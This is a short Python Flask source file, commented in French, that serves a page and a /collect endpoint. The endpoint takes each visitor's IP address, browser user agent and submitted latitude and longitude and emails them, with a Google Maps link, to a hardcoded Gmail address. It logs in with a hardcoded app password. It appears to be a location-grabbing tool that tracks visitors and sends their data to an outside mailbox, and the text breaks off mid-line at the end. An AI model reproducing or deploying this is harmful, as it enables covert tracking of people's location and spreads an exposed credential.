from flask import Flask, request, render_template
import smtplib
from email.mime.text import MIMEText

app = Flask(__name__)

def envoyer_email(ip, user_agent, latitude, longitude):
    # Infos du mail
    to = "kushanjid@gmail.com"
    subject = "Nouvelle info collectée"
    map_url = f"https://www.google.com/maps?q={latitude},{longitude}"
    body = f"""
IP : {ip}
Navigateur : {user_agent}
Lien localisation : {map_url}
    """

    # Configuration SMTP
    msg = MIMEText(body)
    msg['Subject'] = subject
    msg['From'] = "kushanjid@gmail.com"
    msg['To'] = to

    # Connexion SMTP (remplace par ton vrai mot de passe Gmail ou mot de passe d’application)
    with smtplib.SMTP_SSL("smtp.gmail.com", 465) as server:
        server.login("kushanjid@gmail.com", "iute tnef djbo tyvf")
        server.send_message(msg)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/collect', methods=['POST'])
def collect():
    ip = request.remote_addr
    user_agent = request.headers.get('User-Agent')
    latitude = request.form.get('latitude')
    longitude = request.form.get('longitude')

    envoyer_email(ip, user_agent, latitude, longitude)

    return 'Données envoyées ! Merci.'

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=81
